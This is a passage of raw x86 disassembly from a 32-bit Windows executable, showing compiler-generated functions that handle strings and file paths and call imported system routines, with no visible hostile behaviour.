  40238d:	cc                   	int3
  40238e:	cc                   	int3
  40238f:	cc                   	int3
  402390:	55                   	push   %ebp
  402391:	8b ec                	mov    %esp,%ebp
  402393:	6a ff                	push   $0xffffffff
  402395:	68 02 8f 40 00       	push   $0x408f02
  40239a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4023a0:	50                   	push   %eax
  4023a1:	81 ec 14 02 00 00    	sub    $0x214,%esp
  4023a7:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4023ac:	33 c5                	xor    %ebp,%eax
  4023ae:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4023b1:	50                   	push   %eax
  4023b2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4023b5:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4023bb:	c7 85 e4 fd ff ff 00 	movl   $0x0,-0x21c(%ebp)
  4023c2:	00 00 00 
  4023c5:	33 c0                	xor    %eax,%eax
  4023c7:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  4023ce:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4023d5:	89 b5 e0 fd ff ff    	mov    %esi,-0x220(%ebp)
  4023db:	66 89 06             	mov    %ax,(%esi)
  4023de:	33 c9                	xor    %ecx,%ecx
  4023e0:	68 06 02 00 00       	push   $0x206
  4023e5:	51                   	push   %ecx
  4023e6:	8d 95 ea fd ff ff    	lea    -0x216(%ebp),%edx
  4023ec:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4023ef:	52                   	push   %edx
  4023f0:	c7 85 e4 fd ff ff 01 	movl   $0x1,-0x21c(%ebp)
  4023f7:	00 00 00 
  4023fa:	66 89 8d e8 fd ff ff 	mov    %cx,-0x218(%ebp)
  402401:	e8 32 67 00 00       	call   0x408b38
  402406:	83 c4 0c             	add    $0xc,%esp
  402409:	6a 00                	push   $0x0
  40240b:	6a 23                	push   $0x23
  40240d:	8d 85 e8 fd ff ff    	lea    -0x218(%ebp),%eax
  402413:	50                   	push   %eax
  402414:	6a 00                	push   $0x0
  402416:	ff 15 74 a2 40 00    	call   *0x40a274
  40241c:	83 f8 01             	cmp    $0x1,%eax
  40241f:	75 2c                	jne    0x40244d
  402421:	8d 85 e8 fd ff ff    	lea    -0x218(%ebp),%eax
  402427:	8d 50 02             	lea    0x2(%eax),%edx
  40242a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402430:	66 8b 08             	mov    (%eax),%cx
  402433:	83 c0 02             	add    $0x2,%eax
  402436:	66 85 c9             	test   %cx,%cx
  402439:	75 f5                	jne    0x402430
  40243b:	2b c2                	sub    %edx,%eax
  40243d:	d1 f8                	sar    $1,%eax
  40243f:	50                   	push   %eax
  402440:	8d 85 e8 fd ff ff    	lea    -0x218(%ebp),%eax
  402446:	8b ce                	mov    %esi,%ecx
  402448:	e8 c3 4e 00 00       	call   0x407310
  40244d:	8b c6                	mov    %esi,%eax
  40244f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402452:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402459:	59                   	pop    %ecx
  40245a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40245d:	33 cd                	xor    %ebp,%ecx
  40245f:	e8 1c 5d 00 00       	call   0x408180
  402464:	8b e5                	mov    %ebp,%esp
  402466:	5d                   	pop    %ebp
  402467:	c3                   	ret
  402468:	cc                   	int3
  402469:	cc                   	int3
  40246a:	cc                   	int3
  40246b:	cc                   	int3
  40246c:	cc                   	int3
  40246d:	cc                   	int3
  40246e:	cc                   	int3
  40246f:	cc                   	int3
  402470:	55                   	push   %ebp
  402471:	8b ec                	mov    %esp,%ebp
  402473:	6a ff                	push   $0xffffffff
  402475:	68 08 92 40 00       	push   $0x409208
  40247a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402480:	50                   	push   %eax
  402481:	81 ec 50 02 00 00    	sub    $0x250,%esp
  402487:	a1 18 e0 40 00       	mov    0x40e018,%eax
  40248c:	33 c5                	xor    %ebp,%eax
  40248e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402491:	53                   	push   %ebx
  402492:	56                   	push   %esi
  402493:	57                   	push   %edi
  402494:	50                   	push   %eax
  402495:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402498:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40249e:	8b f1                	mov    %ecx,%esi
  4024a0:	33 db                	xor    %ebx,%ebx
  4024a2:	89 9d a8 fd ff ff    	mov    %ebx,-0x258(%ebp)
  4024a8:	33 c0                	xor    %eax,%eax
  4024aa:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  4024b1:	89 5e 10             	mov    %ebx,0x10(%esi)
  4024b4:	89 b5 a4 fd ff ff    	mov    %esi,-0x25c(%ebp)
  4024ba:	66 89 06             	mov    %ax,(%esi)
  4024bd:	68 08 02 00 00       	push   $0x208
  4024c2:	8d 95 e6 fd ff ff    	lea    -0x21a(%ebp),%edx
  4024c8:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4024cb:	33 c9                	xor    %ecx,%ecx
  4024cd:	53                   	push   %ebx
  4024ce:	bf 01 00 00 00       	mov    $0x1,%edi
  4024d3:	52                   	push   %edx
  4024d4:	89 bd a8 fd ff ff    	mov    %edi,-0x258(%ebp)
  4024da:	66 89 8d e4 fd ff ff 	mov    %cx,-0x21c(%ebp)
  4024e1:	e8 52 66 00 00       	call   0x408b38
  4024e6:	83 c4 0c             	add    $0xc,%esp
  4024e9:	68 04 01 00 00       	push   $0x104
  4024ee:	8d 85 e4 fd ff ff    	lea    -0x21c(%ebp),%eax
  4024f4:	50                   	push   %eax
  4024f5:	53                   	push   %ebx
  4024f6:	ff 15 28 a0 40 00    	call   *0x40a028
  4024fc:	8d 85 e4 fd ff ff    	lea    -0x21c(%ebp),%eax
  402502:	8d 50 02             	lea    0x2(%eax),%edx
  402505:	66 8b 08             	mov    (%eax),%cx
  402508:	83 c0 02             	add    $0x2,%eax
  40250b:	66 3b cb             	cmp    %bx,%cx
  40250e:	75 f5                	jne    0x402505
  402510:	2b c2                	sub    %edx,%eax
  402512:	d1 f8                	sar    $1,%eax
  402514:	50                   	push   %eax
  402515:	8d 85 e4 fd ff ff    	lea    -0x21c(%ebp),%eax
  40251b:	8b ce                	mov    %esi,%ecx
  40251d:	e8 ee 4d 00 00       	call   0x407310
  402522:	56                   	push   %esi
  402523:	e8 88 45 00 00       	call   0x406ab0
  402528:	83 f8 ff             	cmp    $0xffffffff,%eax
  40252b:	74 75                	je     0x4025a2
  40252d:	50                   	push   %eax
  40252e:	8d 85 ac fd ff ff    	lea    -0x254(%ebp),%eax
  402534:	8b d6                	mov    %esi,%edx
  402536:	e8 45 34 00 00       	call   0x405980
  40253b:	8d 8d c8 fd ff ff    	lea    -0x238(%ebp),%ecx
  402541:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402544:	e8 b7 59 00 00       	call   0x407f00
  402549:	8b f8                	mov    %eax,%edi
  40254b:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  40254f:	e8 7c 41 00 00       	call   0x4066d0
  402554:	bf 08 00 00 00       	mov    $0x8,%edi
  402559:	39 bd dc fd ff ff    	cmp    %edi,-0x224(%ebp)
  40255f:	72 10                	jb     0x402571
  402561:	8b 8d c8 fd ff ff    	mov    -0x238(%ebp),%ecx
  402567:	51                   	push   %ecx
  402568:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40256e:	83 c4 04             	add    $0x4,%esp
  402571:	33 d2                	xor    %edx,%edx
  402573:	c7 85 dc fd ff ff 07 	movl   $0x7,-0x224(%ebp)
  40257a:	00 00 00 
  40257d:	89 9d d8 fd ff ff    	mov    %ebx,-0x228(%ebp)
  402583:	66 89 95 c8 fd ff ff 	mov    %dx,-0x238(%ebp)
  40258a:	39 bd c0 fd ff ff    	cmp    %edi,-0x240(%ebp)
  402590:	72 10                	jb     0x4025a2
  402592:	8b 85 ac fd ff ff    	mov    -0x254(%ebp),%eax
  402598:	50                   	push   %eax
  402599:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40259f:	83 c4 04             	add    $0x4,%esp
  4025a2:	8b c6                	mov    %esi,%eax
  4025a4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4025a7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4025ae:	59                   	pop    %ecx
  4025af:	5f                   	pop    %edi
  4025b0:	5e                   	pop    %esi
  4025b1:	5b                   	pop    %ebx
  4025b2:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4025b5:	33 cd                	xor    %ebp,%ecx
  4025b7:	e8 c4 5b 00 00       	call   0x408180
  4025bc:	8b e5                	mov    %ebp,%esp
  4025be:	5d                   	pop    %ebp
  4025bf:	c3                   	ret
  4025c0:	55                   	push   %ebp
  4025c1:	8b ec                	mov    %esp,%ebp
  4025c3:	6a ff                	push   $0xffffffff
  4025c5:	68 b0 8e 40 00       	push   $0x408eb0
  4025ca:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4025d0:	50                   	push   %eax
  4025d1:	83 ec 74             	sub    $0x74,%esp
  4025d4:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4025d9:	33 c5                	xor    %ebp,%eax
  4025db:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4025de:	53                   	push   %ebx
  4025df:	57                   	push   %edi
  4025e0:	50                   	push   %eax
  4025e1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4025e4:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4025ea:	33 c0                	xor    %eax,%eax
  4025ec:	66 89 45 80          	mov    %ax,-0x80(%ebp)
  4025f0:	bb 07 00 00 00       	mov    $0x7,%ebx
  4025f5:	33 ff                	xor    %edi,%edi
  4025f7:	6a 01                	push   $0x1
  4025f9:	b8 10 a6 40 00       	mov    $0x40a610,%eax
  4025fe:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  402601:	89 5d 94             	mov    %ebx,-0x6c(%ebp)
  402604:	89 7d 90             	mov    %edi,-0x70(%ebp)
  402607:	e8 04 4d 00 00       	call   0x407310
  40260c:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40260f:	33 c9                	xor    %ecx,%ecx
  402611:	66 89 4d b8          	mov    %cx,-0x48(%ebp)
  402615:	6a 01                	push   $0x1
  402617:	b8 14 a6 40 00       	mov    $0x40a614,%eax
  40261c:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40261f:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  402622:	89 7d c8             	mov    %edi,-0x38(%ebp)
  402625:	e8 e6 4c 00 00       	call   0x407310
  40262a:	8d 55 80             	lea    -0x80(%ebp),%edx
  40262d:	52                   	push   %edx
  40262e:	56                   	push   %esi
  40262f:	8d 5d b8             	lea    -0x48(%ebp),%ebx
  402632:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  402636:	e8 45 0f 00 00       	call   0x403580
  40263b:	83 c4 08             	add    $0x8,%esp
  40263e:	83 7d cc 08          	cmpl   $0x8,-0x34(%ebp)
  402642:	72 0d                	jb     0x402651
  402644:	8b 45 b8             	mov    -0x48(%ebp),%eax
  402647:	50                   	push   %eax
  402648:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40264e:	83 c4 04             	add    $0x4,%esp
  402651:	33 c9                	xor    %ecx,%ecx
  402653:	bb 07 00 00 00       	mov    $0x7,%ebx
  402658:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40265f:	83 7d 94 08          	cmpl   $0x8,-0x6c(%ebp)
  402663:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  402666:	89 7d c8             	mov    %edi,-0x38(%ebp)
  402669:	66 89 4d b8          	mov    %cx,-0x48(%ebp)
  40266d:	72 18                	jb     0x402687
  40266f:	8b 55 80             	mov    -0x80(%ebp),%edx
  402672:	52                   	push   %edx
  402673:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  402679:	83 c4 04             	add    $0x4,%esp
  40267c:	eb 09                	jmp    0x402687
  40267e:	8b ff                	mov    %edi,%edi
  402680:	33 ff                	xor    %edi,%edi
  402682:	bb 07 00 00 00       	mov    $0x7,%ebx
  402687:	33 c0                	xor    %eax,%eax
  402689:	66 89 45 9c          	mov    %ax,-0x64(%ebp)
  40268d:	6a 01                	push   $0x1
  40268f:	b8 10 a6 40 00       	mov    $0x40a610,%eax
  402694:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  402697:	89 5d b0             	mov    %ebx,-0x50(%ebp)
  40269a:	89 7d ac             	mov    %edi,-0x54(%ebp)
  40269d:	e8 6e 4c 00 00       	call   0x407310
  4026a2:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  4026a9:	33 c9                	xor    %ecx,%ecx
  4026ab:	66 89 4d d4          	mov    %cx,-0x2c(%ebp)
  4026af:	6a 02                	push   $0x2
  4026b1:	b8 18 a6 40 00       	mov    $0x40a618,%eax
  4026b6:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4026b9:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  4026bc:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  4026bf:	e8 4c 4c 00 00       	call   0x407310
  4026c4:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  4026c8:	33 db                	xor    %ebx,%ebx
  4026ca:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4026d0:	83 7d e8 08          	cmpl   $0x8,-0x18(%ebp)
  4026d4:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4026d7:	73 03                	jae    0x4026dc
  4026d9:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4026dc:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  4026df:	57                   	push   %edi
  4026e0:	50                   	push   %eax
  4026e1:	56                   	push   %esi
  4026e2:	8b c3                	mov    %ebx,%eax
  4026e4:	e8 07 43 00 00       	call   0x4069f0
  4026e9:	8b d8                	mov    %eax,%ebx
  4026eb:	83 fb ff             	cmp    $0xffffffff,%ebx
  4026ee:	74 11                	je     0x402701
  4026f0:	8d 55 9c             	lea    -0x64(%ebp),%edx
  4026f3:	52                   	push   %edx
  4026f4:	57                   	push   %edi
  4026f5:	8b fe                	mov    %esi,%edi
  4026f7:	e8 f4 40 00 00       	call   0x4067f0
  4026fc:	03 5d ac             	add    -0x54(%ebp),%ebx
  4026ff:	eb cf                	jmp    0x4026d0
  402701:	bf 08 00 00 00       	mov    $0x8,%edi
  402706:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  402709:	72 0d                	jb     0x402718
  40270b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40270e:	50                   	push   %eax
  40270f:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  402715:	83 c4 04             	add    $0x4,%esp
  402718:	33 c9                	xor    %ecx,%ecx
  40271a:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402721:	c7 45 e8 07 00 00 00 	movl   $0x7,-0x18(%ebp)
  402728:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40272f:	66 89 4d d4          	mov    %cx,-0x2c(%ebp)
  402733:	39 7d b0             	cmp    %edi,-0x50(%ebp)
  402736:	72 0d                	jb     0x402745
  402738:	8b 55 9c             	mov    -0x64(%ebp),%edx
  40273b:	52                   	push   %edx
  40273c:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  402742:	83 c4 04             	add    $0x4,%esp
  402745:	6a 02                	push   $0x2
  402747:	68 18 a6 40 00       	push   $0x40a618
  40274c:	56                   	push   %esi
  40274d:	33 c0                	xor    %eax,%eax
  40274f:	e8 9c 42 00 00       	call   0x4069f0
  402754:	83 f8 ff             	cmp    $0xffffffff,%eax
  402757:	0f 85 23 ff ff ff    	jne    0x402680
  40275d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402760:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402767:	59                   	pop    %ecx
  402768:	5f                   	pop    %edi
  402769:	5b                   	pop    %ebx
  40276a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40276d:	33 cd                	xor    %ebp,%ecx
  40276f:	e8 0c 5a 00 00       	call   0x408180
  402774:	8b e5                	mov    %ebp,%esp
  402776:	5d                   	pop    %ebp
  402777:	c3                   	ret
  402778:	cc                   	int3
  402779:	cc                   	int3
  40277a:	cc                   	int3
  40277b:	cc                   	int3
  40277c:	cc                   	int3
  40277d:	cc                   	int3
  40277e:	cc                   	int3
  40277f:	cc                   	int3
  402780:	55                   	push   %ebp
  402781:	8b ec                	mov    %esp,%ebp
  402783:	6a ff                	push   $0xffffffff
  402785:	68 a1 91 40 00       	push   $0x4091a1
  40278a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402790:	50                   	push   %eax
  402791:	83 ec 44             	sub    $0x44,%esp
  402794:	a1 18 e0 40 00       	mov    0x40e018,%eax
  402799:	33 c5                	xor    %ebp,%eax
  40279b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40279e:	53                   	push   %ebx
  40279f:	56                   	push   %esi
  4027a0:	57                   	push   %edi
  4027a1:	50                   	push   %eax
  4027a2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4027a5:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4027ab:	8b d9                	mov    %ecx,%ebx
  4027ad:	33 c0                	xor    %eax,%eax
  4027af:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027b2:	33 c9                	xor    %ecx,%ecx
  4027b4:	c7 43 14 07 00 00 00 	movl   $0x7,0x14(%ebx)
  4027bb:	89 43 10             	mov    %eax,0x10(%ebx)
  4027be:	89 5d b4             	mov    %ebx,-0x4c(%ebp)
  4027c1:	66 89 0b             	mov    %cx,(%ebx)
  4027c4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4027c7:	bf 01 00 00 00       	mov    $0x1,%edi
  4027cc:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  4027cf:	89 7d b0             	mov    %edi,-0x50(%ebp)
  4027d2:	e8 b9 fb ff ff       	call   0x402390
  4027d7:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4027da:	8b f8                	mov    %eax,%edi
  4027dc:	8b f3                	mov    %ebx,%esi
  4027de:	e8 ed 3e 00 00       	call   0x4066d0
  4027e3:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  4027e7:	83 7d e8 08          	cmpl   $0x8,-0x18(%ebp)
  4027eb:	72 0d                	jb     0x4027fa
  4027ed:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4027f0:	52                   	push   %edx
  4027f1:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4027f7:	83 c4 04             	add    $0x4,%esp
  4027fa:	b8 44 f6 40 00       	mov    $0x40f644,%eax
  4027ff:	8d 50 01             	lea    0x1(%eax),%edx
  402802:	8a 08                	mov    (%eax),%cl
  402804:	40                   	inc    %eax
  402805:	84 c9                	test   %cl,%cl
  402807:	75 f9                	jne    0x402802
  402809:	2b c2                	sub    %edx,%eax
  40280b:	0f 84 9e 00 00 00    	je     0x4028af
  402811:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  402814:	bb 01 00 00 00       	mov    $0x1,%ebx
  402819:	e8 32 4a 00 00       	call   0x407250
  40281e:	33 db                	xor    %ebx,%ebx
  402820:	b8 44 f6 40 00       	mov    $0x40f644,%eax
  402825:	c7 45 cc 0f 00 00 00 	movl   $0xf,-0x34(%ebp)
  40282c:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  40282f:	88 5d b8             	mov    %bl,-0x48(%ebp)
  402832:	8d 50 01             	lea    0x1(%eax),%edx
  402835:	8a 08                	mov    (%eax),%cl
  402837:	40                   	inc    %eax
  402838:	3a cb                	cmp    %bl,%cl
  40283a:	75 f9                	jne    0x402835
  40283c:	2b c2                	sub    %edx,%eax
  40283e:	8b f8                	mov    %eax,%edi
  402840:	b8 44 f6 40 00       	mov    $0x40f644,%eax
  402845:	8d 75 b8             	lea    -0x48(%ebp),%esi
  402848:	e8 33 48 00 00       	call   0x407080
  40284d:	8b c6                	mov    %esi,%eax
  40284f:	50                   	push   %eax
  402850:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  402853:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  40285a:	e8 d1 0b 00 00       	call   0x403430
  40285f:	83 c4 04             	add    $0x4,%esp
  402862:	53                   	push   %ebx
  402863:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  402867:	8b 7d b4             	mov    -0x4c(%ebp),%edi
  40286a:	50                   	push   %eax
  40286b:	83 c8 ff             	or     $0xffffffff,%eax
  40286e:	e8 2d 49 00 00       	call   0x4071a0
  402873:	83 7d e8 08          	cmpl   $0x8,-0x18(%ebp)
  402877:	72 0d                	jb     0x402886
  402879:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40287c:	51                   	push   %ecx
  40287d:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  402883:	83 c4 04             	add    $0x4,%esp
  402886:	33 d2                	xor    %edx,%edx
  402888:	88 5d fc             	mov    %bl,-0x4(%ebp)
  40288b:	83 7d cc 10          	cmpl   $0x10,-0x34(%ebp)
  40288f:	c7 45 e8 07 00 00 00 	movl   $0x7,-0x18(%ebp)
  402896:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  402899:	66 89 55 d4          	mov    %dx,-0x2c(%ebp)
  40289d:	72 0d                	jb     0x4028ac
  40289f:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4028a2:	50                   	push   %eax
  4028a3:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4028a9:	83 c4 04             	add    $0x4,%esp
  4028ac:	8b 5d b4             	mov    -0x4c(%ebp),%ebx
  4028af:	8b f3                	mov    %ebx,%esi
  4028b1:	e8 0a fd ff ff       	call   0x4025c0
  4028b6:	8b c3                	mov    %ebx,%eax
  4028b8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4028bb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4028c2:	59                   	pop    %ecx
  4028c3:	5f                   	pop    %edi
  4028c4:	5e                   	pop    %esi
  4028c5:	5b                   	pop    %ebx
  4028c6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4028c9:	33 cd                	xor    %ebp,%ecx
  4028cb:	e8 b0 58 00 00       	call   0x408180
  4028d0:	8b e5                	mov    %ebp,%esp
  4028d2:	5d                   	pop    %ebp
  4028d3:	c3                   	ret
  4028d4:	cc                   	int3
  4028d5:	cc                   	int3
  4028d6:	cc                   	int3
  4028d7:	cc                   	int3
  4028d8:	cc                   	int3
  4028d9:	cc                   	int3
  4028da:	cc                   	int3
  4028db:	cc                   	int3
  4028dc:	cc                   	int3
  4028dd:	cc                   	int3
  4028de:	cc                   	int3
  4028df:	cc                   	int3
  4028e0:	55                   	push   %ebp
  4028e1:	8b ec                	mov    %esp,%ebp
  4028e3:	6a ff                	push   $0xffffffff
  4028e5:	68 d9 92 40 00       	push   $0x4092d9
  4028ea:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4028f0:	50                   	push   %eax
  4028f1:	83 ec 08             	sub    $0x8,%esp
  4028f4:	56                   	push   %esi
  4028f5:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4028fa:	33 c5                	xor    %ebp,%eax
  4028fc:	50                   	push   %eax
  4028fd:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402900:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402906:	8b 75 08             	mov    0x8(%ebp),%esi
  402909:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402910:	8b ce                	mov    %esi,%ecx
  402912:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402919:	e8 62 fe ff ff       	call   0x402780
  40291e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402925:	56                   	push   %esi
  402926:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  40292d:	e8 2e 03 00 00       	call   0x402c60
  402932:	83 c4 04             	add    $0x4,%esp
  402935:	8b c6                	mov    %esi,%eax
  402937:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40293a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402941:	59                   	pop    %ecx
  402942:	5e                   	pop    %esi
  402943:	8b e5                	mov    %ebp,%esp
  402945:	5d                   	pop    %ebp
  402946:	c3                   	ret
  402947:	cc                   	int3
  402948:	cc                   	int3
  402949:	cc                   	int3
  40294a:	cc                   	int3
  40294b:	cc                   	int3
  40294c:	cc                   	int3
  40294d:	cc                   	int3
  40294e:	cc                   	int3
  40294f:	cc                   	int3
  402950:	55                   	push   %ebp
  402951:	8b ec                	mov    %esp,%ebp
  402953:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  402959:	a1 18 e0 40 00       	mov    0x40e018,%eax
  40295e:	33 c5                	xor    %ebp,%eax
  402960:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402963:	56                   	push   %esi
  402964:	68 04 01 00 00       	push   $0x104
  402969:	33 f6                	xor    %esi,%esi
  40296b:	8d 85 f5 fe ff ff    	lea    -0x10b(%ebp),%eax
  402971:	56                   	push   %esi
  402972:	50                   	push   %eax
  402973:	c6 85 f4 fe ff ff 00 	movb   $0x0,-0x10c(%ebp)
  40297a:	e8 b9 61 00 00       	call   0x408b38
  40297f:	83 c4 0c             	add    $0xc,%esp
  402982:	85 ff                	test   %edi,%edi
  402984:	75 11                	jne    0x402997
  402986:	33 c0                	xor    %eax,%eax
  402988:	5e                   	pop    %esi
  402989:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40298c:	33 cd                	xor    %ebp,%ecx
  40298e:	e8 ed 57 00 00       	call   0x408180
  402993:	8b e5                	mov    %ebp,%esp
  402995:	5d                   	pop    %ebp
  402996:	c3                   	ret
  402997:	53                   	push   %ebx
  402998:	68 04 01 00 00       	push   $0x104
  40299d:	8d 8d f4 fe ff ff    	lea    -0x10c(%ebp),%ecx
  4029a3:	51                   	push   %ecx
  4029a4:	6a 00                	push   $0x0
  4029a6:	ff 15 2c a0 40 00    	call   *0x40a02c
  4029ac:	8b 1d 24 a2 40 00    	mov    0x40a224,%ebx
  4029b2:	8d 95 f4 fe ff ff    	lea    -0x10c(%ebp),%edx
  4029b8:	6a 2f                	push   $0x2f
  4029ba:	52                   	push   %edx
  4029bb:	ff d3                	call   *%ebx
  4029bd:	83 c4 08             	add    $0x8,%esp
  4029c0:	85 c0                	test   %eax,%eax
  4029c2:	75 12                	jne    0x4029d6
  4029c4:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  4029ca:	6a 5c                	push   $0x5c
  4029cc:	50                   	push   %eax
  4029cd:	ff d3                	call   *%ebx
  4029cf:	83 c4 08             	add    $0x8,%esp
  4029d2:	85 c0                	test   %eax,%eax
  4029d4:	74 2e                	je     0x402a04
  4029d6:	8d 8d f4 fe ff ff    	lea    -0x10c(%ebp),%ecx
  4029dc:	2b c1                	sub    %ecx,%eax
  4029de:	8b f0                	mov    %eax,%esi
  4029e0:	81 fe 05 01 00 00    	cmp    $0x105,%esi
  4029e6:	7d 06                	jge    0x4029ee
  4029e8:	56                   	push   %esi
  4029e9:	8b d1                	mov    %ecx,%edx
  4029eb:	52                   	push   %edx
  4029ec:	eb 0c                	jmp    0x4029fa
  4029ee:	68 05 01 00 00       	push   $0x105
  4029f3:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  4029f9:	50                   	push   %eax
  4029fa:	57                   	push   %edi
  4029fb:	ff 15 28 a2 40 00    	call   *0x40a228
  402a01:	83 c4 0c             	add    $0xc,%esp
  402a04:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402a07:	5b                   	pop    %ebx
  402a08:	8b c6                	mov    %esi,%eax
  402a0a:	33 cd                	xor    %ebp,%ecx
  402a0c:	5e                   	pop    %esi
  402a0d:	e8 6e 57 00 00       	call   0x408180
  402a12:	8b e5                	mov    %ebp,%esp
  402a14:	5d                   	pop    %ebp
  402a15:	c3                   	ret
  402a16:	cc                   	int3
  402a17:	cc                   	int3
  402a18:	cc                   	int3
  402a19:	cc                   	int3
  402a1a:	cc                   	int3
  402a1b:	cc                   	int3
  402a1c:	cc                   	int3
  402a1d:	cc                   	int3
  402a1e:	cc                   	int3
  402a1f:	cc                   	int3
  402a20:	55                   	push   %ebp
  402a21:	8b ec                	mov    %esp,%ebp
  402a23:	b8 64 44 00 00       	mov    $0x4464,%eax
  402a28:	e8 13 61 00 00       	call   0x408b40
  402a2d:	a1 18 e0 40 00       	mov    0x40e018,%eax
  402a32:	33 c5                	xor    %ebp,%eax
  402a34:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402a37:	53                   	push   %ebx
  402a38:	56                   	push   %esi
  402a39:	57                   	push   %edi
  402a3a:	33 db                	xor    %ebx,%ebx
  402a3c:	68 3f 41 00 00       	push   $0x413f
  402a41:	8d 85 a5 bb ff ff    	lea    -0x445b(%ebp),%eax
  402a47:	53                   	push   %ebx
  402a48:	50                   	push   %eax
  402a49:	8b f1                	mov    %ecx,%esi
  402a4b:	33 ff                	xor    %edi,%edi
  402a4d:	88 9d a4 bb ff ff    	mov    %bl,-0x445c(%ebp)
  402a53:	e8 e0 60 00 00       	call   0x408b38
  402a58:	68 04 01 00 00       	push   $0x104
  402a5d:	8d 8d f5 fe ff ff    	lea    -0x10b(%ebp),%ecx
  402a63:	53                   	push   %ebx
  402a64:	51                   	push   %ecx
  402a65:	89 9d a0 bb ff ff    	mov    %ebx,-0x4460(%ebp)
